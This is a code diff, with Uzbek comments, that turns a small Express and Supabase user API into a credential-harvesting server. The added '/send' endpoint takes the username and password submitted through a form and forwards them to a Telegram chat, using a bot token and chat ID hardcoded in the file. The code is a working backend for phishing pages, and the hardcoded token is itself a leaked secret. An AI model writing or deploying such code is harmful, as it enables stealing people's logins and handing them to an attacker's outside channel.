@@ -1,36 +1,29 @@
-const { createClient } = require("@supabase/supabase-js");
-
+import express from "express";
+import fetch from "node-fetch";
 
 const app = express();
+app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-// Supabase ulanishi
-const supabase = createClient(
-  process.env.SUPABASE_URL,
-  process.env.SUPABASE_KEY
-);
+// Telegram ma'lumotlari
+const BOT_TOKEN = "8434307879:AAFG2h5Z59_7JPziceP4E2Exksk7wuVmuXM";
+const CHAT_ID = "7527317470";
 
-// Misol uchun: user qo‘shish
-app.post("/add", async (req, res) => {
-  const { name, age } = req.body;
+// Forma yuborilganda ishlaydi
+app.post("/send", async (req, res) => {
+  const { username, password } = req.body;
 
-  const { data, error } = await supabase
-    .from("users")
-    .insert([{ name, age }]);
+  // Telegramga yuborish
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: `📩 Yangi ma'lumot:\n👤 Username: ${username}\n🔑 Password: ${password}`
+    })
+  });
 
-  if (error) return res.status(400).json({ error: error.message });
-  res.json(data);
+  res.send("OK");
 });
 
-// Misol uchun: userlarni olish
-app.get("/users", async (req, res) => {
-  const { data, error } = await supabase.from("users").select("*");
-  if (error) return res.status(400).json({ error: error.message });
-  res.json(data);
-});
-
-const port = process.env.PORT || 3000;
-app.listen(port, () => {
-  console.log(`Server ${port}-portda ishlayapti`);
-});
-
+app.listen(3000, () => console.log("✅ Server ishlayapti 3000-portda"));
